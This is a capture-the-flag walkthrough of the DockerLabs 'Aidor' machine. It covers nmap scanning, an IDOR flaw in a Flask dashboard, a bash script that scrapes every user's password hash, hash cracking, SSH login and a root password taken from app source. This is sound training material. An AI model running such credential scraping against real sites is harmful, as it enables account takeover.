![Screenshot](/easy/Aidor/Images/machine.png)

Difficulty: **easy**

Made by: **el pinguino de mario**

# Steps to pwn 🥽

* 👁️  [Reconnaissance](#reconnaissance)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

---

First of all we make sure the machine is up, we can do this with the commmand **ping**

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/facil/aidor]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.271 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.292 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.110 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2037ms
rtt min/avg/max/mdev = 0.110/0.224/0.292/0.081 ms
```

Once we see this, we can start the **reconnaissance** phase.

---
# Reconnaissance

We make our first scan with **nmap** to discover what ports are open in the target.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/facil/aidor]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-18 01:53 -05
Initiating ARP Ping Scan at 01:53
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 01:53, 0.16s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 01:53
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 5000/tcp on 172.17.0.2
Completed SYN Stealth Scan at 01:53, 3.83s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000029s latency).
Scanned at 2025-11-18 01:53:30 -05 for 4s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.27 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

Once the scan concludes we can see 2 ports open:

- port 22 (ssh / secure shell)
- port 5000 *(upnp?)*

We can make another scan with nmap to know more about these 2 ports.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/facil/aidor]
└─$ nmap -p22,5000 -sCV 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-18 01:59 -05
Nmap scan report for 172.17.0.2
Host is up (0.00010s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
5000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.13.5)
|_http-server-header: Werkzeug/3.1.3 Python/3.13.5
|_http-title: Iniciar Sesi\xC3\xB3n
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds
```

**-p22,5000** <- With this argument nmap will only scan this 2 ports that we discover.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

Once the scan finish we can see that the port 5000 it's a website, let's take a look with the browser.

![Screenshot](/easy/Aidor/Images/image1.png)

We can see here a login page, I try to see if it's vulnerable to XSS or to SQLI, but doesn't work.

Let's try to make a new user.

![Screenshot](/easy/Aidor/Images/image2.png)

We can see here a dashboard, but we can't do anything here, im going to try to change the id of the url let's see what happens...

![Screenshot](/easy/Aidor/Images/image3.png)

We successfully change to this another user, we can do some fuzzing to try to see what other possible users are:

First we make a dictionary of numbers starting with the number 1, to the number 100.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/facil/aidor]
└─$ seq 1 100 >> numbers.txt
```

We save all this numbers to this txt file.

---
# Exploitation

Now we can start to make some fuzzing...

![Screenshot](/easy/Aidor/Images/image4.png)

We can see a lot of results here!

Im only thinking to make a bash script... to try to get all the users of the website and also get the hashes of all the users...

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/facil/aidor]
└─$ curl -s "http://172.17.0.2:5000/dashboard?id=23" | html2text
****** DASHBOARD ******
    * Inicio
    * Perfil
    * Estadísticas
    * Configuración
    * Notificaciones
    * Mensajes
    * Reportes
ID de Usuario
#23
***** Bienvenido, rafael.dominguez *****
Último acceso: Recientemente
Cerrar Sesión
**** Rendimiento ****
94.5%
**** Tareas Completadas ****
28/36
**** Notificaciones ****
12
**** Eventos Próximos ****
5
Información del Perfil
Nombre de Usuario rafael.dominguez
Correo Electrónico rafael.dominguez@example.com
ID de Usuario 23
Estado de Cuenta Activa
Cambiar Contraseña
Contraseña Actual (Hash):
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[********************]
Actualizar Contraseña
Actividad Reciente
    * Inicio de sesión exitoso
      Hace unos momentos
    * Perfil actualizado
      Hace 2 días
    * Contraseña cambiada
      Hace 1 semana
```

To make the output more readable we can use **html2text** it's way more clean and useful, we can see the user and also the Hash...

Im going to make a bash script to extract all the possible users and the hashes per each user...

```
#!/bin/bash

for num in {1..100}; do
        get_content=$(curl -s "http://172.17.0.2:5000/dashboard?id=$num" | html2text)
        user=$(echo "$get_content" | awk '/Nombre de Usuario/ {print $NF}')
        hash=$(echo "$get_content" | grep -o '[a-f0-9]\{64\}')

        if [[ -n $user && -n $hash ]]; then
                echo "$user:$hash" >> credentials
        fi
done

echo "[+] All credentials are saved!"
```

With this script we are making a loop, starting with the number 1 to the number 100.

And per each number we are extracting the contents of the website (curl, html2text).

Also we are getting the user only extracting the final line of "Nombre de Usuario", where is the real nickname of the user.

Getting the hash we only are extracting the pattern of the hash **sha256** this hash have a pattern that reaches **64 characters** (```grep -o [a-f0-9]\{64\}```)

And at the end we are saving the user and also the hash in a file (credentials) in the next format:

- **user:hash**

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/facil/aidor]
└─$ ./ExtractCredentials 
[+] All credentials are saved!
```

Okay, let's take a look now the credentials.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/facil/aidor]
└─$ cat credentials 
juan.perez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
maria.garcia:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
carlos.lopez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
ana.martinez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
luis.rodriguez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
laura.gonzalez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
miguel.hernandez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
isabel.diaz:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
javier.sanchez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
elena.fernandez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
david.moreno:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
carmen.romero:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
francisco.alvarez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
patricia.gomez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
antonio.molina:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
rocio.ortiz:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
jose.serrano:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
teresa.marin:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
alejandro.navarro:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
silvia.torres:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
rafael.dominguez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
monica.ramirez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
pedro.castro:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
natalia.ortega:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
sergio.vazquez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
beatriz.iglesias:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
victor.morales:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
clara.santos:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
angel.cortes:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
lucia.guerrero:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
oscar.flores:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
irene.medina:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
ruben.suarez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
veronica.delgado:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
manuel.herrera:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
eva.mendez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
alberto.cruz:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
celia.aguilar:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
daniel.vidal:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
marina.prieto:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
adrian.campos:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
sandra.leon:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
marcos.rivera:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
lorena.arias:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
jordi.pascual:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
noelia.benitez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
guillermo.vicente:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
raquel.mora:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
pingu:dd0284ae23bfe3ed87de34568afa73e03380b7990fcb69b2d11cc902eb1060a3
pepe:7c9e7c1494b2684ab7c19d6aff737e460fa9e98d5a234da1310c97ddf5691834
aidor:7499aced43869b27f505701e4edc737f0cc346add1240d4ba86fbfa251e0fc35
```

We got all the credentials!

But we see here a hash that repeats over and over again.

- **5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8**

This hash converted is: **password**

Then let's filter this hash, to only hashes that really matter.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/facil/aidor]
└─$ cat credentials | grep -v 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8

pingu:dd0284ae23bfe3ed87de34568afa73e03380b7990fcb69b2d11cc902eb1060a3
pepe:7c9e7c1494b2684ab7c19d6aff737e460fa9e98d5a234da1310c97ddf5691834
aidor:7499aced43869b27f505701e4edc737f0cc346add1240d4ba86fbfa251e0fc35
```

We see here 3 users with different hashes.

Let's convert these 3 hashes.

**Note**: I personally use first **crackstation.net** before doing brute force with my own computer.

- 1st Hash: **pingu**
- 2nd Hash: **pepe**
- 3rd Hash: **chocolate**

Let's login this users trough **ssh**...

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/facil/aidor]
└─$ ssh aidor@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:iGG7GiEEPe1NGwC9/nIG97yidxpwEdFa5IPMRp5UUOI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
aidor@172.17.0.2's password: 
Linux 78dee72d97d4 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
aidor@78dee72d97d4:~$
```

We login as the user **aidor** and his password is **chocolate**!

---
# Privilege Escalation

We can try to see some processes that are running in the background:

```
aidor@78dee72d97d4:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2688  1816 ?        Ss   22:07   0:00 /bin/sh -c service ssh start && python3 app.py &&
root          16  0.0  0.1  11780  5400 ?        Ss   22:07   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 start
root          17  0.0  1.0  44560 35776 ?        S    22:07   0:00 python3 app.py
root          18  0.3  1.0 192116 37204 ?        Sl   22:07   0:03 /usr/bin/python3 app.py
root         120  0.0  0.3  19884 13224 ?        Ss   22:20   0:00 sshd-session: aidor [priv]
aidor        128  0.3  0.2  19848  7628 ?        S    22:20   0:00 sshd-session: aidor@pts/0
aidor        129  0.0  0.1   4340  3748 pts/0    Ss   22:20   0:00 -bash
aidor        142  0.0  0.1   6404  3872 pts/0    R+   22:24   0:00 ps aux
```

We can see here that the user **root** are running a python script (**app.py**)

Let's try to find where this file is.

```
aidor@78dee72d97d4:~$ find / -name app.py 2>/dev/null
/usr/lib/python3/dist-packages/flask/app.py
/usr/lib/python3/dist-packages/flask/sansio/app.py
/home/app.py
```

we find the location of the python file.

Let's take a look inside of this script.

```
aidor@78dee72d97d4:~$ head -n 50 /home/app.py 
from flask import Flask, render_template, request, redirect, url_for, session, flash
import sqlite3
import hashlib
import os

app = Flask(__name__)
app.secret_key = 'my_secret_key'

# Ruta para conectar a la base de datos
def get_db():
    conn = sqlite3.connect('database.db')
    return conn

# Crear la base de datos y la tabla si no existen
def create_db():
    if not os.path.exists('database.db'):
        conn = get_db()
        cursor = conn.cursor()
        # Crear la tabla de usuarios si no existe
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL UNIQUE,
            password TEXT NOT NULL,
            email TEXT NOT NULL
        )
        ''')
        # Insertar un usuario de ejemplo si la tabla está vacía
        cursor.execute('SELECT COUNT(*) FROM users')
        count = cursor.fetchone()[0]
        # if count == 0:
        #     cursor.execute('''
        #     INSERT INTO users (username, password, email) VALUES
        #     ('root', 'aa87ddc5b4c24406d26ddad771ef44b0', 'admin@example.com')
        #     ''')  # La contraseña "admin" es hash SHA-256
        conn.commit()
        conn.close()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        # Hash de la contraseña
        hashed_password = hashlib.sha256(password.encode()).hexdigest()

        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM users WHERE username=? AND password=?', (username, hashed_password))
```

Here we can see a **hash** of the user **root**

 - **aa87ddc5b4c24406d26ddad771ef44b0**

Let's try to convert it:

- **estrella**

Now let's try to login as the user **root** with this password.

```
aidor@78dee72d97d4:~$ su root
Password: 
root@78dee72d97d4:/home/aidor# whoami
root
```

Now we are **root** ***...pwned...!***
